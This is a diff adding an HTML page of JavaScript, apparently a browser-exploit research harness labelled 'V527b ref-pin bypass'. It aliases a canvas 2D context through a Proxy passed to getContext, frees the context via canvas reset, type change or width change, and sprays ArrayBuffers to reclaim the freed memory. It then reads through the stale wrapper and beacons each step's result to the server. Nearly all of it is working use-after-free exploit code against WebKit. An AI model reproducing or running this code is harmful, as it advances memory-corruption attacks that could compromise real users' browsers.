@@ -1,0 +1,83 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>V527b — ref-pin bypass: free via canvas lever, then AB reclaim read</title></head>
+<body><script>
+// V527 replica, round 2. Finding from round 1 (this console, 21:10-21:11 EDT): GC-drop of
+// the aliased owner CANNOT free the context while the stale wrapper is held (CANVASID=s8
+// after free+192MB churn; Portablelle's v9 ref-pin predicted it structurally).
+// Round 2 frees the SAME context slot via synchronous levers while the chain stays alive:
+//   L1 canvas.reset()   L2 canvas.type='bitmaprenderer' (type-change clears 2d m_context)
+//   L3 width-widen (probes whether WebKit re-inits backing on size change)
+// Then 500x 768B marker-AB spray, then read through the stale wrapper.
+// Verdicts per pastawithpesto oracle: 9999.99 => AB reclaimed; death at read => reclaim/garbage
+// (or decommit); 1 + CANVASID=s8 => lever didn't free either.
+function bc(m){var u='beacon?m='+encodeURIComponent('V527B '+m);
+  function f(){new Image().src=u+'&t='+Date.now();}f();setTimeout(f,500);setTimeout(f,1000);}
+function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
+function proxySettings(c,cap){var fired=false;
+  return new Proxy({},{get:function(o,p){if(!fired){fired=true;cap.inner=c.getContext('2d');}return false;},
+    has:function(o,p){if(!fired){fired=true;cap.inner=c.getContext('2d');}return true;}});}
+function mkCanvas(i){var c=document.createElement('canvas');c.width=8;c.height=8;c.id='q'+i;
+  return [c,c.getContext('2d')];}
+
+async function flow(lever,label){
+  bc('START lever='+label);
+  var cap={inner:null,outer:null};
+  var c1=document.createElement('canvas');c1.width=8;c1.height=8;c1.id='orig';
+  cap.outer=c1.getContext('2d',proxySettings(c1,cap));
+  var sp=[];for(var i=0;i<500;i++)sp.push(mkCanvas(i));
+  var ident='?';try{ident=cap.inner.canvas.id;}catch(e){bc('ALIAS-READ ERR '+e.name);return;}
+  var idx=ident[0]==='q'?parseInt(ident.slice(1),10):-1;
+  bc('ALIAS ident='+ident);
+  if(idx<0){bc('NOALIAS abort');return;}
+  var el=sp[idx][0];
+  // LEVER
+  try{
+    if(lever==='reset'){ if(typeof el.reset!=='function')throw new Error('no-reset'); el.reset(); }
+    else if(lever==='type'){ if(!('type' in el))throw new Error('no-type-attr'); el.type='bitmaprenderer'; }
+    else if(lever==='width'){ el.width=16; }
+    else throw new Error('unknown');
+    bc('LEVER '+label+' ok ident2='+cap.inner.canvas.id);
+  }catch(e){bc('LEVER '+label+' ERR '+e.name+' '+e.message);return;}
+  await sleep(300);
+  var abs=[];
+  for(i=0;i<500;i++){var ab=new ArrayBuffer(768);var f64=new Float64Array(ab);
+    for(var s2=0;s2<96;s2++)f64[s2]=9999.99;
+    abs.push(ab);}
+  bc('ABSPRAY n='+abs.length);
+  await sleep(300);
+  bc('R1 pre');
+  try{bc('R1 LINEWIDTH='+cap.inner.lineWidth);}catch(e){bc('R1 ERR '+e.name);return;}
+  await sleep(500);
+  bc('R2 pre');
+  try{var d=cap.inner.getLineDash();bc('R2 DASH n='+d.length+' v0='+d[0]);}catch(e){bc('R2 ERR '+e.name);}
+  await sleep(500);
+  bc('R3 pre');
+  try{bc('R3 CANVASID='+cap.inner.canvas.id);}catch(e){bc('R3 ERR '+e.name);}
+  bc('FLOW-DONE '+label);
+}
+
+async function main(){
+  bc('CAP reset='+(typeof HTMLCanvasElement!=='undefined'?(('reset' in HTMLCanvasElement.prototype)?'y':'n'):'?')+
+     ' typeattr='+('type' in document.createElement('canvas')));
+  var t=null;try{t=new ArrayBuffer(8,{rab:true});}catch(e){}
+  bc('CAP rabflag='+(t?Object.prototype.toString.call(t):'ctor-err')+
+     ' invert='+(t?('invertInView' in t)?'y':'n':'-')+
+     ' idbk='+(typeof IDBKeyRange));
+  if(t&&('invertInView' in t)){
+    // sink legs (T4-T6 substitute): what does the C++ sink see when JS byteLength is valid?
+    var v=new Uint8Array(t);for(var z=0;z<8;z++)v[z]=z;
+    try{bc('RAB baseline blob='+(new Blob([v])).size);}catch(e){bc('RAB blob ERR '+e.name);}
+    try{t.invertInView(true);bc('RAB inverted jsLen='+v.byteLength+' blob='+new Blob([v]).size);}
+    catch(e){bc('RAB invert ERR '+e.name);}
+    try{t.invertInView(false);}catch(e){}
+  }
+  await sleep(800);
+  await flow('reset','reset');
+  await sleep(800);
+  await flow('type','type');
+  await sleep(800);
+  await flow('width','width');
+  bc('ALL-DONE');
+}
+setTimeout(main,300);
+</script></body></html>
